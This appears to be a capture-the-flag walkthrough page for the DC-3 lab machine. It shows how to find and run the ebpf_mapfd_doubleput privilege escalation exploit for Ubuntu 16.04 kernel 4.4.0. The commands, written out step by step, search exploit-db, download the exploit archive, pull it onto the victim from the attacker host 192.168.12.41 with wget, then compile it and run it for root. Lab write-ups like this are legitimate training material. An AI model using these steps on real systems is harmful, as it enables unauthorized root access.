<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>5.5 Search OS exploit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u>5.5 Search OS exploit</u></b></h1><br />a) We know the victim OS is “Ubuntu 16.04 LTS” with kernel version “4.4.0-21-generic”, so let's search an exploit.<br /><br /><div class="codebox"><div class="codebox">$&nbsp;searchsploit&nbsp;Ubuntu&nbsp;16.04</div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/195-1.png" alt="images/195-1.png" /><br /><br />We found a privilege escalation exploit for ubuntu 16.04. The file is “39772.txt”.<br /><br />b) Look at the content of the file.<br /><br /><div class="codebox"><div class="codebox">$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>linux<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>39772.txt<br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/195-2.png" alt="images/195-2.png" /><br /><br />c) Download the file, unzip it, go to the new directory and copy "exploit.tar" to “/var/www/html”.<br /><br /><div class="codebox"><div class="codebox">$&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>offensive-security<span style="color:#ff9d00;font-weight:700">/</span>exploitdb-bin-sploits<span style="color:#ff9d00;font-weight:700">/</span>raw<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>bin-sploits<span style="color:#ff9d00;font-weight:700">/</span>39772.zip<br />$&nbsp;<span style="color:#ff9d00;font-weight:700">unzip</span>&nbsp;39772.zip<br />$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;39772<br />$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br /><br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><span style="background-color:#000000;">root@kali:~/Downloads/39772# ls<br />crasher.tar  ebpf_mapfd_doubleput_exploit  exploit.tar</span><br /><br /><br />d) On the Victim Machine.<br /><br /><br />Go to /tmp and get the file “exploit.tar”.<br /><br /><div class="codebox"><div class="codebox">www-data@DC-3<span style="color:#ff9d00;font-weight:700">:/</span>$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<br />www-data@DC-3<span style="color:#ff9d00;font-weight:700">:/</span>$&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>192.168.12.41<span style="color:#ff9d00;font-weight:700">/</span>exploit.tar<br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/195-3.png" alt="images/195-3.png" /><br /><br />e) Untar the file.<br /><br /><div class="codebox"><div class="codebox">www-data@DC-3<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">tar</span>&nbsp;xvf&nbsp;exploit.tar<br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/195-4.png" alt="images/195-4.png" /><br /><br />f) Run the file “compile.sh”.<br /><br /><div class="codebox"><div class="codebox">www-data@DC-3<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;ebpf_mapfd_doubleput_exploit<span style="color:#ff9d00;font-weight:700">/</span><br />www-data@DC-3<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">bash</span>&nbsp;compile.sh<br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/195-5.png" alt="images/195-5.png" /><br /><br /><br /><div class="codebox"><div class="codebox">$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/195-6.png" alt="images/195-6.png" /><br /><br />After compiling a new file has been created.<br /><br />g) Run the “doubleput” file.<br /><br /><div class="codebox"><div class="codebox">$&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>doubleput<br /></div></div><br /><br /><br /><img src="images/195-7.png" alt="images/195-7.png" /><br /><br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>